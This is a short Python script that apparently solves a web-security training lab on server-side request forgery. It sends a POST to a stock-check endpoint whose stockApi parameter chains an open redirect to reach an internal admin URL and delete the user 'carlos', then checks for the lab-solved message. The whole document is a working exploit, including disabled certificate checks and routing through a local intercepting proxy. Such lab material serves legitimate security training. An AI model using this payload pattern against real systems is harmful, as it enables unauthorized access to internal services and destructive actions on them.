# Lab: SSRF with filter bypass via open redirection vulnerability

import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}




def delete_user(url):
    stock_check = '/product/stock'
    param = {'stockApi': '/product/nextProduct?currentProductId=8&path=http://192.168.0.12:8080/admin/delete?username=carlos'}

    r = requests.post(url + stock_check, data=param, verify=False, proxies=proxies)
    
    
    # checking if user is deleted
    if 'Congratulations, you solved the lab!' in r.text:
        print('[+] lab solved')
    else:
        print('[-] lab not solved')





def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]}')
        print(f'[+] Example: {sys.argv[0]} example.com')
        sys.exit(-1)

    url = sys.argv[1]
    
    delete_user(url)
   



if __name__ == '__main__':
    main()